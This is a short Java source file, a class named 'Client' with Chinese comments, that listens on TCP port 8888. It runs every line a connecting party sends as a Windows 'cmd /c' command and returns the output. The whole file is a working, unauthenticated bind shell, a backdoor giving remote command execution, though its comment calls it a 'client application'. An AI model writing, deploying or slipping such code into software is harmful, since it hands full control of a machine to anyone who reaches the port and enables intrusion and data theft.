package service;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class Client {
	//client application
	public static void test3() {

        try {
            ServerSocket serverSocket = new ServerSocket(8888);
            while(true){
            Socket socket = serverSocket.accept();
            System.out.println(socket.getInetAddress());
            PrintWriter clientPw = new PrintWriter(socket.getOutputStream());
            Scanner clientSc = new Scanner(socket.getInputStream());
            clientPw.println("请输入的你要执行的指令");
            clientPw.flush();
            while(clientSc.hasNextLine()){
                try{
                String command = clientSc.nextLine();
                System.out.println(command);
//这里的这个cmd /c 参数表示在命令行下执行，执行完毕后关闭命令行并输出结果
                Process p = Runtime.getRuntime().exec("cmd /c"+command);
                String content = "" ;
                Scanner psi = new Scanner(p.getInputStream());
                while(psi.hasNextLine()){
                    content+=psi.nextLine()+"\r\n";
                }
                System.out.println("执行的结果"+content);
                clientPw.println(content);
                clientPw.flush();
                Scanner pse = new Scanner(p.getErrorStream());
                String errcontent = "" ;
                while(pse.hasNextLine()){
                    errcontent+=pse.nextLine()+"\r\n";
                }
                if(!errcontent.equals("")){
                    clientPw.println(errcontent);
                    clientPw.flush();
                    System.out.println(errcontent);
                }               
                }catch(Exception e){
                    e.printStackTrace();
                }
            }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

	}

}
